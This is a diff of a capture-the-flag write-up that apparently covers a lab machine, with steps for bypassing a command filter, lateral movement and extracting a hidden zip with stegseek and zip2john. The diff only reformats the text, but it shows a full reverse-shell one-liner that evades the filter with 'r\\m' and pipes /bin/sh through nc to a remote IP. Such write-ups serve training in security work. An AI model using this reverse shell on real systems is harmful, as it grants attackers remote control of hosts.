@@ -69,9 +69,8 @@ The web server hosts a "Command Panel." It attempts to filter common shell comma
 <img width="720" height="322" alt="image" src="https://github.com/user-attachments/assets/5f2ab1a2-8237-4805-88a9-53518343a397" />
 
 I proceeded to get a reverse shell back to my machine
-```
-r\\m /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.73.207 1337 >/tmp/f
-```
+`r\\m /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.73.207 1337 >/tmp/f`
+
 
 ### [#] Lateral_Movement:~#
 I found a .helpline.sh script in the home directory of apaar
@@ -107,6 +106,7 @@ The hashes were crackable but I tried loggin in with them, no luck
 
 I went back to the `files` folder from earlier, we had an images directory. I copied the images to my local machine to see if I can get something from it.
 I ran stegseek on the jpeg image and a file was extracted, it was a zipped file.
+
 <img width="577" height="151" alt="image" src="https://github.com/user-attachments/assets/d0f3a233-488c-47fa-a11c-e797d12c101b" />
 
 The zipped file had a password so I used zip2john to get the hash and try to crack the resulting hash
